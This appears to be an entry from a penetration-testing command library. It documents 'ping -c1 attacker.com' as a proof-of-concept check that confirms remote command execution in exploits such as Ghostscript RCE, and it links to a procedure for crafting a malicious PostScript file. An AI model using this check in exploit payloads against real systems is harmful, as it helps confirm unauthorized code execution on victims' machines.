---
id: a2d7f889-209c-4265-b5aa-903a31fb7090
name: ping-test-poc
type: command
executor: bash
data: ping -c1 attacker.com
output: null
created_at: '2025-12-11T06:10:15.545Z'
updated_at: '2025-12-11T06:10:15.545Z'
platforms:
  - Linux
  - Web
tags:
  - poc
  - network
verified: false
validated: true
submitted: true
---

# ping-test-poc

## Command

```bash
ping -c1 attacker.com
```

## Description

Sends a single ICMP echo request to a controlled domain as a proof-of-concept to demonstrate command execution in exploits like Ghostscript RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c1` | Limits the ping to one packet | Yes |
| `attacker.com` | Target domain for ping | Yes |

## Examples

### Basic Usage

```bash
ping -c1 attacker.com
```

### Advanced Usage

```bash
ping -c1 -i 1 attacker.com
```

## Expected Output

A single ping response or network traffic indicating execution, such as '64 bytes from attacker.com' if successful.

## Related

- [[procedures/Craft-Malicious-PostScript-File-for-Ghostscript-RCE]]
